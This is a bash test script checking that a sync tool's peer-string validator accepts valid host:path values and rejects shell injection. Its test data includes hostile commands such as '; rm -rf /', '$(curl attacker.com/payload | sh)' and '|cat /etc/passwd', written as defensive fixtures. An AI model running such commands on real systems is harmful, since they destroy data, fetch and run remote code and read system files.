#!/bin/bash
# ---------------------------------------------------------------------------
# Phase 0 Verification Tests — [S1] Peer Validation
# Run: bash tests/test_peer_validation.sh
# ---------------------------------------------------------------------------
set -uo pipefail

PASS=0
FAIL=0

# Source the regex and validation function from the main script
PEER_REGEX='^[a-zA-Z0-9._-]+(@[a-zA-Z0-9._-]+)?:[a-zA-Z0-9/._ -]+$'
SHELL_META_CHARS='[;$`|&(){}<>\\\"'"'"']'

validate_peer() {
    local peer="$1"
    if [[ "$peer" =~ $SHELL_META_CHARS ]]; then
        return 1
    fi
    if [[ ! "$peer" =~ $PEER_REGEX ]]; then
        return 1
    fi
    return 0
}

assert_valid() {
    local peer="$1"
    if validate_peer "$peer"; then
        echo "  PASS (accepted): $peer"
        ((PASS++))
    else
        echo "  FAIL (rejected, expected accept): $peer"
        ((FAIL++))
    fi
}

assert_invalid() {
    local peer="$1"
    if validate_peer "$peer"; then
        echo "  FAIL (accepted, expected reject): $peer"
        ((FAIL++))
    else
        echo "  PASS (rejected): $peer"
        ((PASS++))
    fi
}

echo "=== [S1] Peer Validation Tests ==="
echo ""
echo "--- Valid peers (should be ACCEPTED) ---"
assert_valid "myserver:/home/user/madhatterDrop"
assert_valid "alice@server.local:/home/alice/madhatterDrop"
assert_valid "192.168.1.50:/home/bob/madhatterDrop"
assert_valid "user@10.0.0.1:/sync/dir"
assert_valid "my-host.example.com:/data/sync"
assert_valid "user@host:/path with spaces/dir"

echo ""
echo "--- Shell injection attempts (should be REJECTED) ---"
assert_invalid '; rm -rf /'
assert_invalid '$(curl attacker.com/payload | sh)'
assert_invalid 'host:/path; whoami'
assert_invalid 'host:/path$(id)'
assert_invalid 'host:/path`id`'
assert_invalid 'host:/path|cat /etc/passwd'
assert_invalid 'host:/path&background'
assert_invalid "host:/path'injection"
assert_invalid 'host:/path"injection'
assert_invalid 'host:/path\escape'

echo ""
echo "--- Malformed peers (should be REJECTED) ---"
assert_invalid ""
assert_invalid "host-without-colon-or-path"
assert_invalid "host/path/no/colon"
assert_invalid ":/path-no-host"
assert_invalid ":"
assert_invalid "   "

echo ""
echo "==========================================="
echo "Results: $PASS passed, $FAIL failed"
echo "==========================================="

if [ "$FAIL" -gt 0 ]; then
    exit 1
fi
exit 0

